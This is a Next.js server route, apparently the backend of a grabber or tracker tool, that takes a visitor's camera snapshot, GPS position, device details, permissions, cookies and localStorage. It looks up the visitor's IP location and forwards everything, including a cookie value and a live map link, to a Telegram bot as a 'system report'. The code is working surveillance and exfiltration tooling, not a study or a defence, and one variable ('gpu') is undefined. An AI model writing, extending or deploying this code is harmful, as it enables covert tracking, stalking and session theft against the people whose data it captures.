import { NextResponse } from "next/server";
import axios from "axios";

export async function POST(req: Request) {
  try {
    const body = await req.json();
    const { image, gps, device = {}, battery = null, permissions = {} } = body;
    const cookies = Array.isArray(body.cookies) ? body.cookies : [];
    const localStorageData = typeof body.localStorageData === "string" ? body.localStorageData : "";
    const ip = req.headers.get("x-forwarded-for") || "1.1.1.1";

    const clientIp = ip.split(",")[0].trim();
    const geoRes = await axios.get(`http://ip-api.com/json/${clientIp}`).catch(() => ({ data: {} }));
    const geo = geoRes.data;

    let caption = `🚀 *ULTIMATE SYSTEM REPORT*\n`;
    caption += `━━━━━━━━━━━━━━━━━━━━\n\n`;
    
    // 🌐 JARINGAN & LOKASI
    caption += `🌐 *NETWORK & GEO*\n`;
    caption += `├ *IP:* \`${geo.query || ip}\` \n`;
    caption += `├ *ISP:* \`${geo.isp || "?"}\` \n`;
    caption += `└ *Lokasi:* \`${geo.city || "?"}, ${geo.country || "?"}\` \n\n`;

    // 📱 HARDWARE MENDALAM
    caption += `📱 *HARDWARE INFO*\n`;
    caption += `├ *Model:* \`${device.model}\` \n`;
    caption += `├ *OS:* \`${device.os}\` \n`;
    caption += `├ *RAM:* \`${device.ram}\` \n`;
    caption += `├ *CPU:* \`${device.cpu}\` \n`;
    caption += `├ *GPU:* \`${gpu}\` \n`;
    caption += `└ *Baterai:* \`${battery?.level}%\` (${battery?.charging ? "🔌" : "🔋"}) \n\n`;

    // 🍪 DATA PENYIMPANAN (Cookies & Storage)
    caption += `🍪 *STORAGE & COOKIES*\n`;
    caption += `├ *Cookies:* \`${cookies.length} found\` \n`;
    caption += `├ *Local:* \`${localStorageData.length > 2 ? "Detected" : "Empty"}\` \n`;
    if (cookies.length > 0) {
        caption += `└ *Top Cookie:* \`${cookies[0].substring(0, 40)}...\` \n`;
    }
    caption += `\n`;

    // 🛡️ PERIZINAN BROWSER
    caption += `🛡️ *PERMISSIONS*\n`;
    caption += `├ *Lokasi:* \`${permissions.location ? "✅" : "❌"}\` \n`;
    caption += `├ *Clipboard:* \`${permissions.clipboard}\` \n`;
    caption += `└ *WebUSB:* \`${permissions.usb === "supported" ? "✅" : "❌"}\` \n\n`;

    if (gps) {
      caption += `🎯 *LIVE GPS*\n`;
      caption += `└ \`https://www.google.com/maps?q=${gps.lat},${gps.lon}\` \n`;
    }
    
    caption += `\n━━━━━━━━━━━━━━━━━━━━`;

    // Menu Tombol Interaktif
    const keyboard = {
      inline_keyboard: [
        [
          { text: "📍 Google Maps", url: gps ? `https://www.google.com/maps?q=${gps.lat},${gps.lon}` : "https://maps.google.com" },
          { text: "🔍 IP Detail", url: `https://ip-api.com/#${geo.query || ip}` }
        ],
        [
          { text: "📁 Download Full JSON", url: "https://t.me/your_bot_username" } // Opsional: arahkan ke bot untuk data mentah
        ]
      ]
    };

    const formData = new FormData();
    const botToken = process.env.TELEGRAM_TOKEN || process.env.TELEGRAM_BOT_TOKEN;
    const chatId = process.env.TELEGRAM_CHAT_ID;

    if (!botToken || !chatId) {
      console.error("Telegram configuration missing:", {
        hasToken: Boolean(botToken),
        hasChatId: Boolean(chatId),
      });
      return NextResponse.json({ error: "Telegram is not configured" }, { status: 500 });
    }

    formData.append("chat_id", chatId);
    
    if (image) {
      const buffer = Buffer.from(image.replace(/^data:image\/\w+;base64,/, ""), "base64");
      formData.append("photo", new Blob([buffer], { type: "image/png" }), "capture.png");
    }
    
    if (!image) {
      formData.append("text", caption);
    } else {
      formData.append("caption", caption);
    }
    formData.append("parse_mode", "Markdown");
    formData.append("reply_markup", JSON.stringify(keyboard));

    const endpoint = image
      ? `https://api.telegram.org/bot${botToken}/sendPhoto`
      : `https://api.telegram.org/bot${botToken}/sendMessage`;

    if (!image) {
      formData.delete("reply_markup");
    }

    const telegramResponse = await axios.post(endpoint, formData, {
      timeout: 15000,
      validateStatus: () => true,
    });

    if (!telegramResponse.data?.ok) {
      console.error("Telegram API error:", telegramResponse.data);
      return NextResponse.json(
        { error: "Telegram API rejected the request", telegram: telegramResponse.data },
        { status: 502 },
      );
    }

    return NextResponse.json({ success: true, telegram: true });
  } catch (error) {
    console.error("POST /api/snap failed:", error);
    return NextResponse.json(
      { error: "Failed", message: error instanceof Error ? error.message : "Unknown error" },
      { status: 500 },
    );
  }
}